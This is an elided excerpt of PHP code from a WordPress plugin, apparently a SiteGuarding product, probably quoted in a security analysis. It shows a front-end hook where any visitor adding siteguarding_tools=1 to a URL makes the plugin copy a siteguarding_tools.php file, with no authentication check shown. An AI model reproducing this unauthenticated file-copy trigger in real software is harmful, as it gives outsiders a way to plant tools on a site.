...
if( !is_admin() ) {
	...
	function plgwpap_footer_protectedby() 
	{
	...
	add_action('wp_footer', 'plgwpap_footer_protectedby', 100);
    
    if (isset($_GET['siteguarding_tools']) && intval($_GET['siteguarding_tools']) == 1)
    {
        plgwpap_CopySiteGuardingTools();
    }
}   
...
function plgwpap_CopySiteGuardingTools()
{
    $file_from = dirname(__FILE__).'/siteguarding_tools.php';
...
function plgwpap_Copy_SG_tools_file()
{
    $file_from = dirname(__FILE__).'/siteguarding_tools.php';
...
function plgwpap_API_Request($type = '')
{
    $plugin_code = 17;
